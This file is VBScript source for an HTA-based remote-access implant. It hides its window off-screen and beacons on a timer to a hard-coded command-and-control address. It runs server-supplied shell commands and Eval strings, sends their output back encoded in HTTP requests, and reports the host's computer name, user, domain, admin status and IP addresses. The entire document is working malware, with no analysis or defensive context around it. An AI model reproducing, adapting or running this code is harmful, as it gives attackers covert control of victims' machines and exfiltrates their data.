window.moveTo -2000,-2000

C2 = "172.16.34.244"
sleepInterval = 1 * 10000

Function Base64Encode(sText)
    On Error Resume Next
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    Base64Encode = Replace(oNode.text, Chr(10), "")
End Function

Function Base64Decode(ByVal vCode)
 On Error Resume Next
 Set oNode = CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
 oNode.dataType = "bin.base64"
 oNode.text = vCode
 Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
 Set oNode = Nothing
 If Err.Number <> 0 Then
    Base64Decode = ""
 End If
End Function

Function Stream_StringToBinary(Text)
 On Error Resume Next
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 2
 BinaryStream.CharSet = "us-ascii"
 BinaryStream.Open
 BinaryStream.WriteText Text
 BinaryStream.Position = 0
 BinaryStream.Type = 1
 BinaryStream.Position = 0
 Stream_StringToBinary = BinaryStream.Read
 Set BinaryStream = Nothing
End Function

Function Stream_BinaryToString(Binary)
 On Error Resume Next
 Set BinaryStream = CreateObject("ADODB.Stream")
 BinaryStream.Type = 1
 BinaryStream.Open
 BinaryStream.Write Binary
 BinaryStream.Position = 0
 BinaryStream.Type = 2
 BinaryStream.CharSet = "utf-8"
 Stream_BinaryToString = BinaryStream.ReadText
 Set BinaryStream = Nothing
End Function

Function httpGET(strURL)
    On Error Resume Next
    Dim blnTimedOut, i, objIE, objMatch, objRE, strText 
    httpGET = ""
    objIE = CreateObject( "InternetExplorer.Application" )
    objIE.Visible = False
    objIE.Navigate2 strURL, 14
    i = 0
    blnTimedOut = False

    Do While objIE.Busy
        Set o = CreateObject("Wscript.Shell")
      	o.Run "timeout /t 1", 0, True 
    Loop

    If Not blnTimedOut Then httpGET = objIE.Document.Body.InnerText
    objIE.Quit
    Set objIE = Nothing
End Function


Function httpPOSTA(URL, body)
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "POST", URL, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"
    objHTTP.setRequestHeader "Content-type", "application/x-www-form-urlencoded"
    objHTTP.send body

    If objHTTP.Status = 200 Then
        httpPOST = objHTTP.ResponseText
    Else 
        httpPOST = objHTTP.Status
    End If
    Set objHTTP = Nothing
End Function

Function pushtoc2(buf)
    b = Base64Encode(buf)
    Replace b, "+", "%2B"
    Replace b, "/", "%2F"
    Replace b, "=", "%3D"
    'If Len(buf) < 20 Then
        pushtoc2 = Base64Decode(httpGET("http://" & C2 & "/" & b))
    'Else
    '    pushtoc2 = Base64Decode(httpPOST("http://" & C2 & "/order" , b))
    'End IF
End Function

Function randomCharacter()
    Randomize
    randomCharacter = chr(Int( ( 125 - 0 + 1 ) * Rnd + 1 ))
End Function

Function genName()
    genName = randomCharacter() & randomCharacter()
End Function

Function intToByteString(MultiByte)
  MultiByte = HEX(MultiByte)
  Dim RS, LMultiByte, Binary
  Const adLongVarBinary = 205
  Set RS = CreateObject("ADODB.Recordset")
  LMultiByte = LenB(MultiByte)
  If LMultiByte>0 Then
    RS.Fields.Append "mBinary", adLongVarBinary, LMultiByte
    RS.Open
    RS.AddNew
      RS("mBinary").AppendChunk MultiByte & ChrB(0)
    RS.Update
    Binary = RS("mBinary").GetChunk(LMultiByte)
  End If
  a = CStr(Binary)
  If Len(a) < 2 Then
    a = Chr(0) & a
  End If
  intToByteString = a
End Function

Public Function SplitString(str, numOfChar)
    Dim sArr() 
    Dim nCount
    ReDim sArr(Len(str) \ numOfChar)
    Do While Len(str)
        sArr(nCount) = Left(str, numOfChar)
        str = Mid(str, numOfChar + 1)
        nCount = nCount + 1
    Loop
    SplitString = sArr
End Function

Function sendData(data)
    If Len(data) = 0 Then
        buf = instanceName & chr(5) & "sleep" & chr(0) & chr(0)
        ret = pushtoc2(buf)
        sendData = ret
    Else:

        If Len(data) > 400 Then
          parts = SplitString(data, 400) 
          Dim i
          For i = 0 To ubound(parts)
              ret = sendData(parts(i))
          Next
        Else
            buf = instanceName & chr(5) & "shell" & intToByteString(Len(data)) & data 
            ret = pushtoc2(buf)
        End If
    End If
End Function

Function runCmd(cmd)
  On Error Resume Next

  CreateObject("Wscript.Shell").Run "cmd /c " & cmd & " > C:\Users\%username%\AppData\cache0.dat 2>&1", 0, True

  runCmd = CreateObject("Scripting.FileSystemObject").OpenTextFile("C:\Users\" & CreateObject("WinNTSystemInfo").UserName & "\AppData\cache0.dat", 1).ReadAll

  CreateObject("Wscript.Shell").Run "cmd /c del C:\Users\%username%\AppData\cache0.dat", 0, False

End Function

Function runCmdOLD(cmd)
    Dim ObjExec
    Dim strFromProc

    Set objShell = CreateObject("WScript.Shell")
    Set ObjExec = objShell.Exec(cmd)
    a = ""
    Do
        l = ObjExec.StdOut.ReadLine()

        If Len(l) > 0 Then
          a = a & l & chr(10)
        End If 

        Set l = Nothing
    Loop While Not ObjExec.StdOut.atEndOfStream

    Do
        l = ObjExec.StdErr.ReadLine()

        If Len(l) > 0 Then
          a = a & l & chr(10)
        End If 

        Set l = Nothing
    Loop While Not ObjExec.StdErr.atEndOfStream

    Set ObjExec = Nothing
  
    runCmd = a
    Set a = Nothing
End Function

Function Hex2Dbl(h)
    Hex2Dbl = CDbl("&h0" & h)
    If Hex2Dbl < 0 Then Hex2Dbl = Hex2Dbl + 4294967296 
End Function


Function parseMessage(buf)
  On Error Resume Next
    If TypeName(buf) = "String" Then
        If Len(buf) > 0 Then

            messageLen = Asc(Mid(buf, 1, 1))
            message = Mid(buf, 2, messageLen)
            
            dataLen = CInt("&h" & HEX(Asc(Mid(buf, 1 + messageLen + 1, 1))) & HEX(Asc(Mid(buf, 1 + messageLen + 2, 1))) )
            data = Mid(buf, 1 + messageLen + 3, dataLen)
            
            If message = "shell" Then
               ' output = runCmd("cmd /c " & data)
                output = runCmd(data)
                If TypeName(output) = "String" Then
                    If Len(output) > 0 Then
                        sendData(output)
                    End If
                End If
            ElseIf message = "kill" Then
                Self.Close
                window.close
            ElseIf message = "sleep" Then
                sleepInterval = CInt(data)
            ElseIf message = "eval" Then
                ret = Cstr(Eval(data))
                sendData(ret)
            ElseIf message = "info" THen
                sendInfo()
            End If 

        End If 
    End If 
End Function

Function checkin()
    ret = sendData("")
  
    parseMessage(ret)
    a = window.setTimeout("checkin", sleepInterval, "VBScript")
End Function

instanceName = genName() 
a = window.setTimeout("checkin", sleepInterval, "VBScript")

Function AllProcessRunningEXE( strComputerArg )
strProcessArr = ""
    Dim Process, strObject
    strObject   = "winmgmts://" & strComputerArg
    For Each Process in GetObject( strObject ).InstancesOf( "win32_process" )
        strProcessArr = strProcessArr & ";" & vbNewLine & Process.name
    Next
    AllProcessRunningEXE = Mid(strProcessArr,3,Len(strProcessArr))
End Function
'EXE_Process = AllProcessRunningEXE(".")
'sendData(EXE_Process)


Function sendInfo()
  Set objSysInfo = CreateObject( "WinNTSystemInfo" )
  computerName = objSysInfo.ComputerName
  userName = objSysInfo.UserName


  Set objWMISvc = GetObject( "winmgmts:\\.\root\cimv2" )
  Set colItems = objWMISvc.ExecQuery( "Select * from Win32_ComputerSystem" )
  domain = ""
  For Each objItem in colItems
      domain = objItem.Domain
  Next

  isAdministrator = false
  Set objGroup = GetObject("WinNT://./Administrators")
  For Each objUser in objGroup.Members
      If objUser.Name = userName Then
          isAdministrator = true        
      End If
  Next

  strQuery = "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE MACAddress > ''"

  Set objWMIService = GetObject( "winmgmts://./root/CIMV2" )
  Set colItems      = objWMIService.ExecQuery( strQuery, "WQL", 48 )

  ip = ""
  For Each objItem In colItems
      If IsArray( objItem.IPAddress ) Then
          If UBound( objItem.IPAddress ) = 0 Then
              ip = ip & objItem.IPAddress(0) & " "
          Else
              ip = ip & Join( objItem.IPAddress, "," ) & " "
          End If
      End If
  Next


  buf = ""
  buf = chr(Len(computerName)) & computerName
  buf = buf & chr(Len(userName)) & userName
  if isAdministrator Then
    buf = buf & chr(1)
  Else
    buf = buf & chr(0)
  End If
  buf = buf & chr(Len(domain)) & domain 
  buf = buf & chr(Len(ip)) & ip 


  data = instanceName & chr(4) & "info" & intToByteString(Len(buf)) & buf 
  ret = pushtoc2(data)
End Function

'sendInfo()
